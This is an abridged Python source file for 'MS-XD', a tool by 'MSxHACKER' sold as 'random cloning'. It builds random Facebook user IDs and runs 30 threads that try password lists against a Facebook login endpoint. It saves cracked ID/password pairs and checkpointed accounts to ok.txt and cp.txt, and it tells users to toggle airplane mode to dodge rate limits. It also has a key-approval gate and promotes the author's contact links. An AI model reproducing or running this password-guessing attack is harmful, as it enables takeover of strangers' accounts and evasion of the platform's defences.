...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m MSxHACKER\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : MSxHACKER \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/MSxHACKER \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./Muhammad Muazzam \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/MSxHACKER/MS-XD/blob/main/Approval.txt"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/share/16QzikYvB5/")
...
def notice():
	...
	runtxt("\n\033[0;97m JOIN MY GROUP FOR MORE UPDATES 🤝✨️ ")
	os.system("xdg-open https://m.me/j/AbZkM7TAWGx4bcuj/")
	runtxt("\033[0;97m SEND KEY ON MY WHATSAPP NUMBER FOR APPROVAL 🤝❤️️")
	os.system("xdg-open https://wa.me/+923495151766")
	subprocess.check_output(["am", "start", "https://wa.me/+923495151766"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/MSxHACKER/MS-XD/blob/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author ❤️   : MSxHACKER \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github 🖤  : https://github.com/MSxHACKER\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook 💙: www.facebook.com/Muhammad Muazzam\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		print("%s [%s•%s] %sTOOL NAME : %sMS-XD"%(G,R,G,B,G))
		print("%s [%s•%s] %sTOOL TYPE : %sRANDOM CLONING"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s1"%(G,R,G,B,G))
		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
		print("───────────────────────────────────────────────────────× ")
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m FOLLOW ME ON FB FIRST\x1b[0m\x1b[1;97m] \033[1;37m ")
		subprocess.check_output(["am", "start", "https://www.facebook.com/share/16QzikYvB5/"])
		print("───────────────────────────────────────────────────────× ")
		print("%s [%s1%s]%s RANDOM 2009-11"%(G,R,G,Y,B))
		...
		if tanya in ["", " "]:
			...
			Main()
#yahan nichy koch cherna ni just name chnge krna
	def fbtua(self):
		x = 11111111
		xx = 99999999
		idx = "1000000" 
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				logo2()
				print("───────────────────────────────────────────────────────× ")
				print("\033[0;92m[=×>]\033[0;92m NOTE : ENJOY MY TOOL")
				print("\033[0;92m[=×>]\033[0;92m NOTE : HAR 10 MIN BAD AIRPLANE MOD ON/OFF KRO ")
				print("\033[0;97m───────────────────────────────────────────────────────× ")
				for user in self.id:
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=MS-XD=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=MS-XD=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=MS-XD=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=MS-XD=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue

 #MS copy krke apna name dal dena bs 👆
